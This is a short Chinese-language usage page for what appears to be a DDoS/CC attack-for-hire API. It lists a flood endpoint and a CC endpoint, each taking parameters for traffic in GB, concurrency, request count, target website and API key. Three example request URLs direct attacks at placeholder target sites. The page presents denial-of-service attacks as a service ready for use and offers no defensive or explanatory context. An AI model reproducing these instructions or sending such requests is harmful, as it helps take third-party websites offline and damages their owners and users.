API 介绍

本页面展示 DDoS/CC 攻击 API 端点的使用说明和示例。

DDoS API

接口地址：xxx.cn/ddos

参数：ll = 流量 (GB), bf = 并发, cs = 请求数, wz = 目标网站, key = API 密钥

CC API

接口地址：xxx.cn/cc

参数：bf = 并发, cs = 请求数, wz = 目标网站, key = API 密钥

示例

示例 1: https://xxx.cn/ddos?wz=https://xxxx.cn&bf=100&cs=50&ll=1&key=8888
示例 2: https://xxx.cn/cc?wz=https://xxxx.cn&bf=100&cs=50&key=8888
示例 3: https://xxx.cn/ddos?wz=https://yyyy.cn&bf=200&cs=75&ll=2&key=8888
